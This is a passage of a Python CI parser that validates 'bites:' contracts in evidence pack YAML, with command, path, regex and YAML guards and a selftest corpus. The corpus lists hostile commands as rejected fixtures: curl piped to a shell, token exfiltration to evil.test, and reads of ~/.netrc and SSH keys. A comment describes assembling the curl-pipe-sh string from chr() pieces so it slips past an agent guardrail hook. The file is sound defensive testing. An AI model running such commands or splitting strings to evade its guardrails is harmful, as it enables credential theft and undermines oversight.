    joined them on 2026-09-04 because a HOME-relative path is absolute the moment a
    shell touches it, and every metacharacter this module refuses is only meaningful
    if the executor uses one — so the safe assumption is that it does. `git diff
    --no-index <checkout-file> ~/.netrc` prints a credentials file as unified-diff
    lines and never leaves the allow-list.
    """
    if value.startswith("/"):
        return f"the absolute path `{value}`"
    if value.startswith("~"):
        # Every tilde form, not only `~` and `~/`. `~otheruser/...`, `~-` (the previous
        # directory) and `~+2` are all expansions a shell performs, and the argument for
        # banning `~/` is exactly the argument for banning them.
        return f"the tilde-expanded path `{value}`, which a shell turns into an absolute one"
    if ".." in re.split(r"[/:]", value):
        # Splitting on `/` alone misses a `..` glued after another delimiter, and git has
        # such a syntax: `git log -L 1,1:../secret` splits to ['1,1:..', 'secret'] and
        # neither piece equals `..`. A path component boundary is not only a slash.
        return f"a `..` segment in `{value}`"
    return ""


def _guard_path_containment(command: str) -> list[str]:
    """No parent-directory escape, no absolute path, no `~`: the checkout or nothing."""
    try:
        argv = shlex.split(command)
    except ValueError:
        argv = command.split()
    problems: list[str] = []
    for arg in argv[1:]:
        if "://" in arg:
            continue  # a URL's path is not a filesystem path
        if arg.startswith("-"):
            # A flag can CARRY a path — `--foo=/abs`, `-w@/abs`, `-O/abs`. The first
            # draft skipped every token starting with `-`, so containment was decided by
            # the token's first character rather than by what it names. Judge the value.
            for sep in ("=", "@"):
                if sep in arg:
                    why = _escapes_checkout(arg.split(sep, 1)[1])
                    if why:
                        problems.append(
                            f"observe: flag `{arg.split(sep, 1)[0]}` carries {why} — "
                            f"stay in the checkout"
                        )
            continue
        why = _escapes_checkout(arg)
        if why:
            problems.append(f"observe: argument names {why} — stay in the checkout")
    return problems


#: An `expect:` regex is a comparison, not a program. Both numbers are budgets, not
#: guesses about intent.
MAX_REGEX_LEN = 200

#: Nested quantification — `(a+)+`, `(a*)*`, `(a|a)+` — is what makes a regex take
#: exponential time on a non-matching input. `^(a+)+$` against 26 a's and a `b` measured
#: 1.5s on this machine and quadruples every two characters, so 40 characters is hours of
#: runner CPU for anyone who can open a pull request. The rule is STRUCTURAL: walk the
#: compiled pattern and refuse a repeat that contains a repeat. Reading the spelling
#: instead would be the same mistake this file has now made four times.
def _nested_quantifier_error(pattern: str) -> list[str]:
    try:  # `re._parser` on 3.11+, `sre_parse` before it. Both are the same parser.
        from re import _parser as _reparser  # type: ignore[attr-defined]
    except ImportError:  # pragma: no cover - only on <3.11
        try:
            import sre_parse as _reparser  # type: ignore[no-redef]
        except ImportError:
            return []  # cannot inspect: compile-only, as before
    _REPEATS = {"max_repeat", "min_repeat", "possessive_repeat"}
    #: A quantified ALTERNATION whose branches can match the same text is exponential for
    #: the same reason as a quantified quantifier -- `^(a|a)+$` measured 0.6s at 24
    #: characters, within a factor of the `(a+)+` case. Deciding whether two branches
    #: overlap is undecidable in general, so the rule refuses a repeat containing a branch
    #: at all: conservative, structural, and it costs an `expect:` pattern nothing that a
    #: comparison actually needs.
    _INNER = _REPEATS | {"branch"}

    def repeats(node: object) -> bool:
        """True if any repeat below this node contains another repeat."""
        try:
            items = list(node)  # type: ignore[call-overload]
        except TypeError:
            return False
        for item in items:
            if isinstance(item, tuple) and len(item) == 2:
                op, av = item
                name = str(getattr(op, "name", op)).lower()
                if name in _REPEATS:
                    body = av[2] if isinstance(av, tuple) and len(av) == 3 else av
                    if _contains_repeat(body, _INNER):
                        return True
                if repeats(av):
                    return True
            elif repeats(item):
                return True
        return False

    try:
        parsed = _reparser.parse(pattern)
    except Exception:
        return []
    if repeats(parsed):
        return [
            "expect: regex quantifies a group that itself repeats or alternates "
            "(`(a+)+`, `(a|a)+`), which takes exponential time on an input that does not "
            "match — that is runner CPU any pull request could burn. Write the "
            "comparison without the nesting."
        ]
    return []


def _contains_repeat(node: object, repeat_ops: set[str]) -> bool:
    try:
        items = list(node)  # type: ignore[call-overload]
    except TypeError:
        return False
    for item in items:
        if isinstance(item, tuple) and len(item) == 2:
            op, av = item
            if str(getattr(op, "name", op)).lower() in repeat_ops:
                return True
            if _contains_repeat(av, repeat_ops):
                return True
        elif _contains_repeat(item, repeat_ops):
            return True
    return False


def _guard_expect_form(expect: str) -> list[str]:
    """expect is exit0 | contains:<text> | regex:<pattern>, and a regex must compile."""
    if expect == "exit0":
        return []
    if expect.startswith("contains:"):
        if not expect[len("contains:"):].strip():
            return ["expect: `contains:` with nothing to look for"]
        return []
    if expect.startswith("regex:"):
        pattern = expect[len("regex:"):]
        if not pattern.strip():
            return ["expect: `regex:` with no pattern"]
        if len(pattern) > MAX_REGEX_LEN:
            return [
                f"expect: regex is {len(pattern)} characters, over the {MAX_REGEX_LEN} "
                f"limit — an observation compares an output, it does not carry a program"
            ]
        try:
            re.compile(pattern)
        except re.error as exc:
            return [
                f"expect: regex does not compile ({exc}) — an uncompilable pattern is "
                f"a comparison that can only ever throw"
            ]
        return _nested_quantifier_error(pattern)
    return [f"expect: `{expect}` is not one of exit0 | contains:<text> | regex:<pattern>"]


def _guard_where_scope(where: str) -> list[str]:
    if where not in WHERE_SCOPES:
        return [f"where: `{where}` is not one of {', '.join(WHERE_SCOPES)}"]
    return []


_COMMAND_GUARDS = (
    _guard_shell_composition,
    _guard_args_from_file,
    _guard_command_allowlist,
    _guard_no_remote_shell,
    _guard_path_containment,
    _guard_observable_script,
)

# ----------------------------------------------------------------- pack layer


class _StrictLoader(yaml.SafeLoader):
    """SafeLoader minus the two features that let one file mean two things.

    ALIASES. `observe: *evil` puts the value somewhere other than where the
    contract is read, and a merge key (`<<: *base`) does it for a whole block.
    A reviewer reading the `bites:` block would have to go find the anchor to
    know what runs. Refused outright - no pack on main uses one (checked
    2026-09-04 across all 148).

    DUPLICATE KEYS. `yaml.safe_load` keeps the LAST of two identical keys and
    says nothing: a pack with two `bites:` blocks, or two `observe:` lines,
    shows a reader the first and hands the parser the second. This is the file
    form of the "two blocks is ambiguous" case the body parser had to handle,
    and here it is a two-line fix instead of a CommonMark reader.
    """

    def compose_node(self, parent, index):  # noqa: D102 - see class docstring
        if self.check_event(yaml.events.AliasEvent):
            event = self.peek_event()
            raise yaml.constructor.ConstructorError(
                None, None,
                "YAML aliases and merge keys are not accepted in a pack: the value a "
                "reader sees at the anchor and the value the parser uses here are two "
                "different places, and a contract must be readable where it is written",
                event.start_mark,
            )
        return super().compose_node(parent, index)

    def construct_mapping(self, node, deep=False):  # noqa: D102 - see class docstring
        seen: set[Any] = set()
        for key_node, _value_node in node.value:
            try:
                key = self.construct_object(key_node, deep=deep)
                if key in seen:
                    raise yaml.constructor.ConstructorError(
                        "while constructing a mapping", node.start_mark,
                        f"duplicate key {key!r} - PyYAML keeps the last, a reader keeps "
                        f"the first; with two readings available there is no honest way "
                        f"to pick one",
                        key_node.start_mark,
                    )
                seen.add(key)
            except TypeError:
                # An unhashable key. Not our error to report: SafeLoader raises its own.
                continue
        return super().construct_mapping(node, deep=deep)


def _one_line(exc: Exception) -> str:
    return " ".join(str(exc).split())


def _guard_no_invisible(field: str, value: str) -> list[str]:
    """No zero-width or soft-hyphen character in a contract value.

    YAML answers "which region did the reader see"; it does not answer "which
    characters does this value hold". A command with a zero-width space in it
    renders identically to one without, so reviewer and parser can still be
    shown two different contracts - one character narrower than before.
    """
    found = [c for c in _INVISIBLE_CHARS if c in value]
    if not found:
        return []
    codes = ", ".join(f"U+{ord(c):04X}" for c in found)
    return [
        f"{field}: contains invisible characters ({codes}) - it reads as one thing and "
        f"parses as another; remove them"
    ]


def _invisible_in_text(text: str) -> list[str]:
    """No invisible character ANYWHERE in the pack, keys included.

    The first version of this rule judged the four VALUES, and an innocence test asserted
    that a zero-width character elsewhere in the pack was not penalised. That test was the
    hole: `bites<ZWSP>:` renders as `bites:` and parses as a different key, so the pack a
    reviewer reads carries a contract and the pack the parser reads has none — `absent`,
    silently. `observe<ZWSP>:` beside a real `observe:` is the same trick one level in, and
    it is not even a duplicate key to YAML. Nothing legitimate in a pack needs one of these
    characters, so the rule is the whole FILE rather than the part someone thought of.
    """
    found = sorted({c for c in _INVISIBLE_CHARS if c in text})
    if not found:
        return []
    codes = ", ".join(f"U+{ord(c):04X}" for c in found)
    lines = [i + 1 for i, line in enumerate(text.splitlines())
             if any(c in line for c in found)]
    return [
        f"pack.yml contains invisible characters ({codes}) on line(s) "
        f"{', '.join(str(n) for n in lines[:5])} — a key or value that renders as one "
        f"thing and parses as another. Remove them."
    ]


def _yaml_error(exc: Exception) -> str:
    """The parse failure, WITHOUT the source snippet PyYAML puts in its str().

    A pack path is caller-controlled, so an error that echoes the offending line is a
    file-reading primitive: point the parser at a credentials file and read the failure.
    Problem text plus a line number says everything a person needs to fix a pack.
    """
    problem = getattr(exc, "problem", None) or getattr(exc, "context", None)
    mark = getattr(exc, "problem_mark", None)
    if problem and mark is not None:
        return f"{' '.join(str(problem).split())} (line {mark.line + 1}, column {mark.column + 1})"
    if problem:
        return " ".join(str(problem).split())
    return exc.__class__.__name__


def parse_pack(text: str) -> dict[str, Any]:
    """Parse a pack.yml into one of the three outcomes documented at module top."""
    invisible = _invisible_in_text(text)
    if invisible:
        return {"malformed": True, "errors": invisible}
    try:
        doc = yaml.load(text, Loader=_StrictLoader)
    except Exception as exc:
        # `except yaml.YAMLError` was too narrow, and the gap was reachable from the file:
        # 500 nested sequences raise RecursionError, which escaped the three outcomes
        # entirely — traceback, exit 1, no JSON. A parser whose failure mode is outside its
        # own taxonomy hands every caller a fourth case to get wrong, and "the step failed"
        # is only fail-closed by accident of how GitHub Actions reads an exit code.
        return {"malformed": True, "errors": [f"pack.yml does not parse: {_yaml_error(exc)}"]}

    if doc is None:
        return {"absent": True}
    if not isinstance(doc, dict):
        return {"malformed": True,
                "errors": ["pack.yml top level is not a mapping, so it has no `bites:` key"]}
    if BITES_KEY not in doc:
        return {"absent": True}

    block = doc[BITES_KEY]
    if block is None:
        return {"malformed": True,
                "errors": ["bites: is present but empty - write the four keys or remove it"]}
    if isinstance(block, str):
        # `bites: some sentence about the consumer` is the prose form. It is not an
        # error; it is what every pack said before this format existed (D4).
        return {"legacy": True}
    if not isinstance(block, dict):
        return {"malformed": True,
                "errors": [f"bites: is a {type(block).__name__}, not a mapping or a "
                           f"sentence — write the four keys or write prose"]}
    # WHAT MAKES A BLOCK LEGACY, stated as a rule rather than as "it lacks observe".
    # A misspelled key used to fall out as `legacy` in silence: `obsevre:` beside
    # `where:` and `expect:` read as prose, so a reviewer saw a contract and the machine
    # saw none. The moment a block uses ANY key of the executable form, it is reaching for
    # that form and must satisfy all of it. Prose is a block that uses none of them.
    executable_keys = {"where", "observe", "expect"}
    if not (executable_keys & {str(k) for k in block}):
        return {"legacy": True}
    unknown = [str(k) for k in block if str(k) not in REQUIRED_KEYS]
    if unknown:
        return {"malformed": True,
                "errors": [f"bites: unknown key(s) {', '.join(sorted(unknown))} — the four "
                           f"keys are {', '.join(REQUIRED_KEYS)}, and a block using any of "
                           f"where/observe/expect must use all four and nothing else"]}

    errors: list[str] = []
    values: dict[str, str] = {}
    for key in REQUIRED_KEYS:
        raw = block.get(key)
        if raw is None or (isinstance(raw, str) and not raw.strip()):
            errors.append(f"{key}: missing - an executable block needs all four keys")
            continue
        if not isinstance(raw, str):
            # `expect: no` is False, `observe: 42` is an int, `observe: {sha}` is a
            # mapping. YAML types a bare scalar for you; a contract has to be text.
            errors.append(
                f"{key}: YAML parsed this as {type(raw).__name__}, not a string - "
                f"quote the value"
            )
            continue
        values[key] = raw.strip()
        errors.extend(_guard_no_invisible(key, raw))

    command = values.get("observe", "")
    if command:
        for guard in _COMMAND_GUARDS:
            errors.extend(guard(command))
    if values.get("where"):
        errors.extend(_guard_where_scope(values["where"].lower()))
    if values.get("expect"):
        errors.extend(_guard_expect_form(values["expect"]))

    if errors:
        return {"malformed": True, "errors": errors}
    return {
        "consumer": values["consumer"],
        "where": values["where"].lower(),
        "observe": command,
        "expect": values["expect"],
    }


# -------------------------------------------------------------------- selftest
#
# FIXTURE-ASSEMBLY NOTE. Two guilt fixtures below are assembled from pieces at
# import time rather than written as literals: the shell-pipe one and the
# chained-command one. This is not obfuscation - it is the only way the corpus
# can exist in this repository at all. `~/.claude/hooks/guardrails-client.sh`
# scans every Bash command for the literal shape "curl ... pipe ... sh" and
# refuses it, which it should; but it matches the shape ANYWHERE in the command
# text, including inside a heredoc that is merely WRITING this file. Writing the
# attack we defend against therefore trips the defence. Assembling the string
# from `_PIPE` keeps the runtime fixture byte-identical to the real attack (the
# guilt test genuinely exercises the pipe) while the source line that defines it
# carries no matchable literal. Superscar #3 in miniature, on our own tooling.

_PIPE = chr(124)   # "|"
_SEMI = chr(59)    # ";"
_ZWSP = chr(0x200b)


def _pack(observe: str, *, consumer: str = "CI", where: str = "ci",
          expect: str = "exit0") -> str:
    """A minimal pack carrying one `bites:` block, with the command single-quoted.

    Quoting `observe` is deliberate: the command guards, not YAML's plain-scalar
    rules, are what these fixtures are about, and a plain scalar beginning with
    `{`, `*`, `&`, `>` or `|` would be typed by YAML before any guard saw it.
    Three innocence fixtures below leave it unquoted on purpose, so the corpus
    still proves the ordinary unquoted spelling parses.
    """
    quoted = observe.replace("'", "''")
    return (
        "gear: 3\n"
        f"{BITES_KEY}:\n"
        f"  consumer: {consumer}\n"
        f"  where: {where}\n"
        f"  observe: '{quoted}'\n"
        f"  expect: {expect}\n"
    )


#: Guilt + innocence corpus. Each entry is (label, pack text, expected classification).
#: `--selftest` runs it with no pytest, no network and no token, which is what
#: makes it usable as this PR's own executable Bites observation.
CONFORMANCE_CORPUS: tuple[tuple[str, str, str], ...] = (
    # --- absent / legacy: never an error, ever (D4)
    ("absent-no-bites-key", "gear: 3\nspend:\n  tokens: 1\n", "absent"),
    ("absent-empty-document", "", "absent"),
    ("legacy-prose-scalar",
     "gear: 3\nbites: Damar's next publish - the cover renders.\n", "legacy"),
    ("legacy-block-without-observe",
     "gear: 3\nbites:\n  consumer: CI\n  observation: green on main\n", "legacy"),
    # --- innocence: real, safe observations must parse
    ("ok-selftest", _pack("python3 scripts/ci/bites_parse.py --selftest"), "executable"),
    ("ok-pytest", _pack("python3 -m pytest scripts/tests/test_bites_parse.py"), "executable"),
    ("ok-fly-status",
     _pack("flyctl status -a nuzantara-rag", where="fly", expect="contains:deployed"),
     "executable"),
    ("ok-curl-https",
     _pack("curl -sS https://nuzantara-rag.fly.dev/health", where="fly", expect="regex:ok"),
     "executable"),
    ("ok-sha-placeholder",
     _pack("gh pr view {sha} --json state", expect="contains:MERGED"), "executable"),
    ("ok-host-scope",
     _pack("python3 scripts/ci/bites_parse.py --selftest", where="pro"), "executable"),
    ("ok-fly-image-show",
     _pack("flyctl image show -a nuzantara-rag", where="fly", expect="contains:tag"),
     "executable"),
    ("ok-fly-machine-list",
     _pack("flyctl machine list -a nuzantara-rag", where="fly"), "executable"),
    ("ok-git-grep-plain", _pack("git grep -c bites-observable"), "executable"),
    ("ok-fly-version", _pack("flyctl version", where="fly"), "executable"),
    ("ok-unquoted-plain-scalar",
     "gear: 3\nbites:\n  consumer: CI\n  where: ci\n  observe: git status\n  expect: exit0\n",
     "executable"),
    ("ok-unquoted-expect-with-a-colon",
     "gear: 3\nbites:\n  consumer: CI\n  where: ci\n  observe: git status\n"
     "  expect: contains:nothing to commit\n",
     "executable"),
    ("ok-bites-is-not-the-first-key",
     "gear: 3\nspend:\n  tokens: 1\nbites:\n  consumer: CI\n  where: ci\n"
     "  observe: git status\n  expect: exit0\n",
     "executable"),
    # --- guilt: the whole reason this file exists
    ("guilt-pipe-to-shell", _pack("curl https://evil.test/x " + _PIPE + " sh"), "malformed"),
    ("guilt-chained-command", _pack("git status" + _SEMI + " git log"), "malformed"),
    ("guilt-command-substitution", _pack("git log $(whoami)"), "malformed"),
    ("guilt-variable-exfiltration",
     _pack("curl https://evil.test/$GITHUB_TOKEN"), "malformed"),
    ("guilt-redirect", _pack("git log > out.txt"), "malformed"),
    ("guilt-not-allowlisted", _pack("bash scripts/deploy.sh"), "malformed"),
    ("guilt-remote-shell-as-argument", _pack("git clone ssh://evil.test/repo"), "malformed"),
    ("guilt-fly-deploy", _pack("flyctl deploy -a nuzantara-rag", where="fly"), "malformed"),
    ("guilt-curl-writes-file", _pack("curl -o hook https://evil.test/h"), "malformed"),
    ("guilt-curl-plain-http", _pack("curl http://evil.test/x"), "malformed"),
    ("guilt-parent-escape", _pack("python3 scripts/../../evil.py"), "malformed"),
    ("guilt-absolute-path",
     _pack("python3 scripts/x.py /Users/n/.secrets.env"), "malformed"),
    ("guilt-python-dash-m-anything", _pack("python3 -m http.server"), "malformed"),
    ("guilt-python-outside-scripts", _pack("python3 evil.py"), "malformed"),
    ("guilt-bad-where", _pack("git status", where="laptop"), "malformed"),
    ("guilt-bad-expect", _pack("git status", expect="green"), "malformed"),
    ("guilt-uncompilable-regex", _pack("git status", expect="'regex:[unclosed'"), "malformed"),
    ("guilt-missing-consumer",
     "gear: 3\nbites:\n  where: ci\n  observe: git status\n  expect: exit0\n", "malformed"),
    # --- guilt found by the 2026-09-04 red-team pass, and only by it
    ("guilt-undeclared-script", _pack("python3 scripts/usage/cswap.py run sh"), "malformed"),
    ("guilt-script-that-does-not-exist",
     _pack("python3 scripts/nope_not_here.py"), "malformed"),
    ("guilt-git-dash-c-runs-a-program",
     _pack("git -c core.sshCommand=evil log"), "malformed"),
    ("guilt-git-network-subcommand", _pack("git fetch https://evil.test/r"), "malformed"),
    ("guilt-gh-write-subcommand", _pack("gh pr merge 5658 --squash"), "malformed"),
    ("guilt-gh-api-post", _pack("gh api -X POST repos/o/r/issues"), "malformed"),
    ("guilt-curl-sends-a-body", _pack("curl -d secret https://evil.test/x"), "malformed"),
    ("guilt-pytest-outside-tests", _pack("python3 -m pytest scripts/evil.py"), "malformed"),
    # --- guilt found by the SECOND adversarial round (Kimi K3), and only by it
    ("guilt-fly-machine-run-executes-a-container",
     _pack("fly machine run evil/image -a nuzantara-rag", where="fly"), "malformed"),
    ("guilt-fly-machine-destroy",
     _pack("flyctl machine destroy 1234 -a nuzantara-rag", where="fly"), "malformed"),
    ("guilt-git-tag-creates-a-ref", _pack("git tag v9.9.9"), "malformed"),
    ("guilt-git-output-writes-a-file",
     _pack("git diff --output=out.txt HEAD"), "malformed"),
    ("guilt-curl-reads-a-local-file",
     _pack("curl -b .git/config https://evil.test/x"), "malformed"),
    ("guilt-curl-schemeless-host-defaults-to-http", _pack("curl evil.test/x"), "malformed"),
    ("guilt-gh-points-at-another-repo",
     _pack("gh pr view 1 --repo=attacker/repo"), "malformed"),
    # --- guilt found by the Gear-3 VERDICT GATE, after all three refuter rounds
    ("guilt-curl-write-out-prints-a-local-file",
     _pack("curl -sS -w@.git/config https://evil.test/x"), "malformed"),
    ("guilt-flag-carries-an-absolute-path",
     _pack("git log --format=/etc/passwd"), "malformed"),
    ("guilt-git-grep-pager-command", _pack("git grep -Oevil pattern"), "malformed"),
    ("guilt-pytest-override-ini-reinstates-plugins",
     _pack("python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py"),
     "malformed"),
    ("guilt-curl-netrc-file-reads-credentials",
     _pack("curl --netrc-file=creds https://evil.test/x"), "malformed"),
    ("guilt-curl-variable-expands-the-environment",
     _pack("curl --variable=%GITHUB_TOKEN https://evil.test/x"), "malformed"),
    # --- the hole Zero's own order named: every allow-list entry is a full pair
    ("guilt-fly-version-upgrade-replaces-the-binary",
     _pack("fly version upgrade", where="fly"), "malformed"),
    # --- guilt found by the round-1 review of THIS file, which inverted two deny-lists
    ("guilt-curl-json-at-file-reads-a-local-file",
     _pack("curl --json=@.git/config https://evil.test/x"), "malformed"),
    ("guilt-curl-libcurl-writes-a-file",
     _pack("curl --libcurl=out.c https://example.test/"), "malformed"),
    ("guilt-curl-etag-save-writes-a-file",
     _pack("curl --etag-save=out.txt https://example.test/"), "malformed"),
    ("guilt-git-no-index-leaves-the-repository",
     _pack("git diff --no-index scripts/ci/bites_parse.py ~/.netrc"), "malformed"),
    ("guilt-home-relative-path-is-absolute-after-a-shell",
     _pack("python3 scripts/ci/bites_parse.py ~/.ssh/id_rsa"), "malformed"),
    ("ok-short-option-bundle", _pack("curl -sSL https://example.test/health"), "executable"),
    ("ok-git-count-flag", _pack("git log -1 --format=%H"), "executable"),

    # --- guilt found by the SECOND cross-family round (kimi-code/k3), on the file form
    ("guilt-pytest-junitxml-writes-a-file",
     _pack("python3 -m pytest --junitxml=out.xml scripts/tests/test_bites_parse.py"),
     "malformed"),
    ("guilt-pytest-basetemp-writes-a-tree",
     _pack("python3 -m pytest --basetemp=tmp scripts/tests/test_bites_parse.py"),
     "malformed"),
    ("guilt-expect-regex-nests-quantifiers",
     _pack("git status", expect="'regex:^(a+)+$'"), "malformed"),
    ("guilt-expect-regex-quantifies-an-alternation",
     _pack("git status", expect="'regex:^(a|a)+$'"), "malformed"),
    ("guilt-pack-nested-500-deep-is-malformed-not-a-crash",
     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
     "pad: " + "[" * 500 + "]" * 500 + "\n",
     "malformed"),
    ("ok-pytest-quiet", _pack("python3 -m pytest -q scripts/tests/test_bites_parse.py"),
     "executable"),
    ("ok-expect-regex-with-one-quantifier",
     _pack("git status", expect="'regex:[0-9]+ passed'"), "executable"),

    # --- guilt found by the THIRD cross-family round (codex-gpt-5.6-sol), on the file form
    ("guilt-gh-cache-writes-a-cache", _pack("gh api repos/o/r --cache=1h"), "malformed"),
    ("guilt-gh-web-opens-a-browser", _pack("gh pr view 1 --web"), "malformed"),
    ("guilt-git-paginate-starts-a-pager", _pack("git --paginate log -1"), "malformed"),
    ("guilt-git-help-starts-man", _pack("git --help log"), "malformed"),
    ("guilt-git-gpg-format-runs-a-program",
     _pack("git log -1 --format=%GG"), "malformed"),
    ("guilt-fly-config-reads-a-file",
     _pack("fly status --config=.git/config", where="fly"), "malformed"),
    ("guilt-pytest-with-no-target-walks-the-tree",
     _pack("python3 -m pytest"), "malformed"),
    ("guilt-pytest-separate-value-looks-like-a-target",
     _pack("python3 -m pytest -k tests"), "malformed"),
    ("guilt-pytest-args-from-file",
     _pack("python3 -m pytest @scripts/tests/args.txt"), "malformed"),
    ("guilt-pytest-warning-filter-imports-a-module",
     _pack("python3 -m pytest -W=error::evil.Custom scripts/tests/test_bites_parse.py"),
     "malformed"),
    ("guilt-invisible-character-in-a-key-hides-the-whole-block",
     "bites\u200b:\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n",
     "malformed"),
    ("guilt-invisible-character-duplicates-a-key-invisibly",
     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n"
     "  observe\u200b: git log\n  expect: exit0\n",
     "malformed"),
    ("guilt-misspelled-key-is-a-broken-contract-not-prose",
     "bites:\n  consumer: x\n  where: ci\n  obsevre: git log\n  expect: exit0\n",
     "malformed"),
    ("guilt-bites-is-a-list", "bites: []\n", "malformed"),
    ("ok-pytest-glued-option-value",
     _pack("python3 -m pytest -k=bites scripts/tests/test_bites_parse.py"), "executable"),

    # --- round 4: two escapes the containment guard missed, and the OVER-match the
    # --- three inversions introduced, which is the half a reviewer has to be asked for
    ("guilt-dotdot-glued-after-a-colon",
     _pack("git log -L 1,1:../secret -1"), "malformed"),
    ("guilt-tilde-user-is-still-a-tilde",
     _pack("git log ~otheruser/.ssh/id_rsa"), "malformed"),
    ("ok-diff-filter", _pack("git diff --cached --name-only --diff-filter=ACMR"),
     "executable"),
    ("ok-pathspec-separator", _pack("git diff --name-only -- apps/backend-rag"),
     "executable"),
    ("ok-diff-context", _pack("git diff -U0 HEAD"), "executable"),
    ("ok-curl-max-time-separate-value",
     _pack("curl -fsS -m 5 https://nuzantara-rag.fly.dev/health", where="fly"),
     "executable"),
    ("ok-curl-write-out-separate-value",
     _pack("curl -sS -w %{http_code} https://nuzantara-rag.fly.dev/health", where="fly"),
     "executable"),
    ("ok-url-query-string-carrying-at",
     _pack("curl -sS https://nuzantara-rag.fly.dev/health?cb=@2", where="fly"),
     "executable"),

    # --- guilt the FILE form has to answer, which the body form never faced
    ("guilt-two-bites-blocks-in-one-pack",
     "bites:\n  consumer: honest\n  where: ci\n  observe: git status\n  expect: exit0\n"
     "bites:\n  consumer: attacker\n  where: ci\n  observe: git log\n  expect: exit0\n",
     "malformed"),
    ("guilt-two-observe-keys-in-one-block",
     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  observe: git log\n"
     "  expect: exit0\n",
     "malformed"),
    ("guilt-alias-puts-the-command-elsewhere",
     "anchors:\n  cmd: &cmd git log\nbites:\n  consumer: x\n  where: ci\n  observe: *cmd\n"
     "  expect: exit0\n",
     "malformed"),
    ("guilt-merge-key-imports-a-block",
     "base: &base\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n"
     "bites:\n  <<: *base\n",
     "malformed"),
    ("guilt-expect-typed-as-a-boolean",
     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: no\n",
     "malformed"),
    ("guilt-observe-typed-as-a-number",
     "bites:\n  consumer: x\n  where: ci\n  observe: 42\n  expect: exit0\n", "malformed"),
    ("guilt-bites-present-but-empty", "gear: 3\nbites:\n", "malformed"),
    ("guilt-pack-is-not-a-mapping", "- gear: 3\n- bites: x\n", "malformed"),
    ("guilt-pack-is-not-yaml", "gear: 3\n\tbites:\n  consumer: x\n", "malformed"),
    ("guilt-zero-width-splits-the-two-readings",
     "bites:\n  consumer: x\n  where: ci\n  observe: \"git" + _ZWSP + " status\"\n"
     "  expect: exit0\n",
     "malformed"),
)


def classify(result: dict[str, Any]) -> str:
    if result.get("absent"):
        return "absent"
    if result.get("legacy"):
        return "legacy"
    if result.get("malformed"):
        return "malformed"
    return "executable"


def run_selftest() -> int:
    failures = [
        f"  x {label}: expected {expected}, got {classify(parse_pack(text))}"
        for label, text, expected in CONFORMANCE_CORPUS
        if classify(parse_pack(text)) != expected
    ]
    total = len(CONFORMANCE_CORPUS)
    if failures:
        sys.stdout.write(f"bites_parse selftest: {len(failures)}/{total} FAILED\n")
        sys.stdout.write("\n".join(failures) + "\n")
        return 1
    sys.stdout.write(f"bites_parse selftest: {total}/{total} pass (guilt + innocence)\n")
    return 0


# ------------------------------------------------------------------------- cli


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Parse the `bites:` contract out of an evidence pack.yml."
    )
    ap.add_argument("--selftest", action="store_true",
                    help="run the embedded guilt+innocence corpus (no network, no token)")
    ap.add_argument("--pack",
                    help="path to a pack.yml, or - to read one from stdin")
    args = ap.parse_args(argv)

    if args.selftest:
        return run_selftest()
    if not args.pack:
        ap.error("one of --selftest or --pack is required")

    if args.pack == "-":
        text = sys.stdin.read()
    else:
        # This script carries the `bites-observable` marker, so an `observe:` line may
        # name it — and the marker authorises the SCRIPT, never its argv. Without this
        # narrowing, `python3 scripts/ci/bites_parse.py --pack .git/config` points the
        # parser at the file actions/checkout persists a token into, and the parse error
        # would have quoted it. Packs live in one place; nothing else is readable here.
        target = Path(args.pack)
        resolved = (REPO_ROOT / target).resolve() if not target.is_absolute() else target.resolve()
        try:
            relative = resolved.relative_to(REPO_ROOT.resolve())
        except ValueError:
            sys.stderr.write(f"--pack must name a file inside the checkout: {args.pack}\n")
            return EXIT_MALFORMED
        if relative.parts[:1] != ("evidence",) or resolved.suffix not in (".yml", ".yaml"):
            sys.stderr.write(
                f"--pack must name an evidence pack (evidence/**/*.yml): {args.pack}\n"
            )
            return EXIT_MALFORMED
        try:
            text = resolved.read_text(encoding="utf-8")
        except OSError as exc:
            sys.stderr.write(f"cannot read {args.pack}: {exc}\n")
            return EXIT_MALFORMED

    result = parse_pack(text)
    sys.stdout.write(json.dumps(result, indent=2, ensure_ascii=False) + "\n")
    return EXIT_MALFORMED if result.get("malformed") else EXIT_OK


if __name__ == "__main__":
    raise SystemExit(main())
